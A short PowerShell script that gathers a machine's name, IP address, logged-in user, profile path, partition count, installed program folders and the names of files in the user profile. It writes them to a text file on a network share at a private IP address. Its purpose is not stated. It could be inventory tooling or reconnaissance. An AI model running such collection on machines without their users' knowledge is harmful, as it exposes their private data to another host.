$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address 
$ip=$ipV4.IPAddressToString
$address ='\\192.168.150.1\share\datas\'+$ip+'UserInfo.txt'


#get data from os
$computerInfo = Get-ComputerInfo -property CsName, CsUserName
"------Computer Name: " + $computerInfo.CsName | out-file $address 
"------UserName: " + $computerInfo.CsUserName | Add-Content $address 
"------User Path: " + $env:USERPROFILE | Add-Content $address 
$PartitionCount = Get-Partition
$PartitionCount = $PartitionCount.PartitionNumber[-1]
"------Disk Partition Count: " + $PartitionCount | Add-Content $address 
$instaled64BitApps = get-childitem 'C:\Program Files\'| select name
$instaled32BitApps = get-childitem 'C:\Program Files (x86)\'| select name
"------Instaled Apps: " | Add-Content $address 
$instaled32BitApps.name | Add-Content $address 
$instaled64BitApps.name | Add-Content $address 
$userFiles = Get-ChildItem -Recurse -Depth 5 $env:USERPROFILE
"------User Files: " | Add-Content $address 
$userFiles.name | Add-Content $address 


